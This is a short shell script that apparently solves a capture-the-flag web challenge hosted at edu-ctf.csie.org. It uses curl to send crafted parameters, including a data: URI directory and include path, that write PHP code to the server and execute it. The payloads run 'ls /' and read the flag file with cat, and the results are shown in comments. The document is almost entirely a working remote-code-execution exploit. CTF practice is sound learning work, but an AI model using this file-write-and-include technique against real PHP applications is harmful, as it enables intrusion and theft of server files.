#!/bin/sh

urlencode() (
    # https://blog.longwin.com.tw/2017/12/bash-shell-curl-send-urlencode-args-2017/
    data="$(curl --silent --output /dev/null --write-out %{url_effective} --get --data-urlencode "$1" "")"
    if [ $? != 3 ]; then
        echo "Unexpected error" >&2
        return -1
    fi
    echo "${data##/?}"
    return 0
)

solve() (
    url='https://edu-ctf.csie.org:10155'
    f='data:,a' # dirname to write content to
    i='data:,a/meow' # filename to include
    c=$1 # file content

    if [ -n "$2" ]; then
        verbose_opt='--verbose'
    else
        verbose_opt=''
    fi

    curl "$url" "$verbose_opt" --insecure --get \
        --data-urlencode "f=$f" \
        --data-urlencode "i=$i" \
        --data-urlencode "c[]=$c"

    return 0
)

solve "<?php system('ls /');" | head -n 10
# flag_is_here

solve "<?php echo\`cat /f*\`;" | head -n 1
# FLAG{w3lc0me_t0_th3_PHP_W0r1d}
